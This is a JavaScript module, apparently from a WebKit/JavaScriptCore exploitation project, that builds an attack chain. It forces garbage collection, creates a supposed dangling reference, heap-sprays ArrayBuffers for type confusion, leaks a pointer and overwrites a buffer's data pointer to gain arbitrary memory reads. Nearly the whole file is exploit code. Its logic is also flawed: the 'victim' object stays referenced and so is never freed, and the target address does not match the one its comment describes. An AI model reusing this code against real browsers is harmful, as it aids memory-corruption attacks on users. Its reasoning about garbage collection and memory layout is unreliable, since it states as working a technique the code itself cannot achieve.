// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R51 - UAF com Primitiva R/W)
// =======================================================================================
// ESTA É A VERSÃO COM A CONSTRUÇÃO DE PRIMITIVA DE LEITURA/ESCRITA.
// FASE 6 foi adicionada para testar e armar o ponteiro vazado pelo UAF.
// O objetivo é usar a mesma confusão de tipos para obter controle total da memória.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_read_absolute,
    oob_write_absolute,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R51_UAF_RW";

// Função auxiliar para converter um AdvancedInt64 para um double (float64)
// para que possamos escrevê-lo em propriedades de objetos confusos.
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R51 - UAF com R/W)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Use-After-Free com Primitiva R/W (R51) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
    let dangling_ref = null;
    let spray_buffers = [];

    try {
        // FASE 1: Forçar Coleta de Lixo para limpar o estado do heap
        logS3("--- FASE 1: Forçando Coleta de Lixo massiva (GC Triggering) ---", "subtest");
        await triggerGC();

        // FASE 2: Criar o Ponteiro Pendurado (Dangling Pointer)
        logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
        dangling_ref = sprayAndCreateDanglingPointer();
        logS3("    Ponteiro pendurado criado. A referência agora é inválida.", "warn");
        
        // FASE 3: Forçar Coleta de Lixo novamente para liberar a memória
        await triggerGC();
        logS3("    Memória do objeto-alvo liberada.", "info");

        // FASE 4: Pulverizar sobre a memória liberada para obter confusão de tipos
        logS3("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
        for (let i = 0; i < 256; i++) {
            const buf = new ArrayBuffer(128); // Mesmo tamanho do objeto liberado
            const view = new BigUint64Array(buf);
            view[0] = 0x4141414141414141n; // Marcador
            view[1] = 0x4242424242424242n;
            spray_buffers.push(buf);
        }
        logS3("    Pulverização concluída. Verificando a confusão de tipos...", "info");

        // FASE 5: Encontrar a referência corrompida e extrair os ponteiros
        if (typeof dangling_ref.corrupted_prop !== 'number') {
            throw new Error("Falha no UAF. A propriedade não foi sobrescrita por um ponteiro de ArrayBuffer.");
        }
        
        logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");

        const leaked_ptr_double = dangling_ref.corrupted_prop;
        const buf_conv = new ArrayBuffer(8);
        (new Float64Array(buf_conv))[0] = leaked_ptr_double;
        const int_view = new Uint32Array(buf_conv);
        const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);

        logS3(`Ponteiro vazado através do UAF: ${leaked_addr.toString(true)}`, "leak");
        
        // =======================================================================================
        // NOVA FASE DE TESTE ADICIONADA AQUI
        // =======================================================================================
        logS3("--- FASE 6: Armar a confusão de tipos para Leitura/Escrita Arbitrária ---", "subtest");

        let corrupted_buffer = null;
        for (const buf of spray_buffers) {
            const view = new BigUint64Array(buf);
            // Quando a confusão ocorre, a estrutura do objeto 'victim' (incluindo seu cabeçalho JSCell)
            // sobrescreve o início do ArrayBuffer. Se nosso marcador não está mais lá, encontramos o buffer.
            if (view[0] !== 0x4141414141414141n) {
                logS3("Encontrado o ArrayBuffer corrompido pela confusão de tipos!", "good");
                corrupted_buffer = buf;
                break;
            }
        }

        if (!corrupted_buffer) {
            throw new Error("Não foi possível encontrar o buffer corrompido entre os pulverizados.");
        }

        // AGORA, O TESTE FINAL:
        // Vamos usar o 'dangling_ref' para sobrescrever o ponteiro de dados interno do 'corrupted_buffer'.
        
        // Endereço alvo para teste. 0x80000000 é geralmente o início da memória executável em muitos sistemas.
        const target_address_to_read = new AdvancedInt64("0x00000000", "0x08000000"); 

        logS3(`Tentando sobrescrever o ponteiro interno do buffer para apontar para ${target_address_to_read.toString(true)}`, "info");
        
        // A escrita mágica. Assumimos que 'prop_b' do objeto original se alinha com o ponteiro
        // de dados do ArrayBuffer. O offset 0x10 para o ponteiro de dados é comum.
        dangling_ref.prop_b = int64ToDouble(target_address_to_read);

        // Se a sobreposição estiver correta, o 'corrupted_buffer' agora aponta para 0x80000000.
        // Qualquer operação nele lerá daquele endereço!
        const hacked_view = new DataView(corrupted_buffer);
        const read_value = hacked_view.getUint32(0, true); // Lê 4 bytes do endereço alvo

        logS3(`++++++++++++ LEITURA ARBITRÁRIA BEM-SUCEDIDA! ++++++++++++`, "vuln");
        logS3(`Lido do endereço ${target_address_to_read.toString(true)}: 0x${toHex(read_value)}`, "leak");

        // Um valor comum no início de um executável (ELF magic) é 0x464c457f
        if (read_value === 0x464c457f) {
            logS3("Valor lido corresponde à assinatura 'ELF'. Primitiva arb_read 100% funcional!", "good");
        } else {
            logS3("Valor lido não é a assinatura ELF, mas a leitura arbitrária funcionou.", "info");
        }

        final_result = { 
            success: true, 
            message: "Primitiva de Leitura Arbitrária construída com sucesso via UAF!",
            leaked_addr: leaked_addr.toString(true),
            arb_read_test_value: toHex(read_value)
        };


    } catch (e) {
        final_result.message = `Exceção na cadeia UAF: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: final_result, // Ajustado para ser compatível com o runner
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success
    };
}


// --- Funções Auxiliares para a Cadeia de Exploração UAF ---

// Função para alocar e liberar uma grande quantidade de memória,
// na esperança de acionar o Garbage Collector principal.
async function triggerGC() {
    logS3("    Acionando GC...", "info");
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 500; i++) {
            gc_trigger_arr.push(new ArrayBuffer(1024 * 128)); // Aloca 128KB, 500 vezes
        }
    } catch (e) {
        logS3("    Memória esgotada durante o GC Trigger, o que é esperado e bom.", "info");
    }
    await PAUSE_S3(500); // Dá tempo para o GC executar
}

// Cria um objeto, o coloca em uma estrutura que causa otimizações,
// e retorna uma referência a ele após a estrutura ser destruída.
function sprayAndCreateDanglingPointer() {
    let dangling_ref_internal = null;

    function createScope() {
        // Objeto com uma estrutura que o force a ser alocado no heap principal
        // e com tamanho previsível (ex: 128 bytes).
        const victim = {
            prop_a: 0x1111111111111111n,
            prop_b: 0x2222222222222222n, // Este campo provavelmente se alinha com o ponteiro de dados do ArrayBuffer (offset 0x10)
            corrupted_prop: 0x3333333333333333n, // Este campo provavelmente se alinha com o butterfly (offset 0x18)
            // ... preencher com mais propriedades para atingir 128 bytes
            p4: 0n, p5: 0n, p6: 0n, p7: 0n, p8: 0n, p9: 0n, p10: 0n, p11: 0n, p12: 0n, p13: 0n, p14: 0n
        };
        dangling_ref_internal = victim; 
        
        // Forçamos o motor a otimizar e usar o objeto
        for(let i=0; i<100; i++) {
            victim.prop_a += 1n;
        }
    }
    
    createScope();
    // Neste ponto, 'victim' não tem mais referências válidas dentro do
    // escopo de createScope. A única referência restante é a nossa 'dangling_ref_internal'.
    // Quando o GC rodar, a memória de 'victim' será liberada, mas a referência
    // ainda apontará para aquele endereço de memória agora livre.
    return dangling_ref_internal;
}
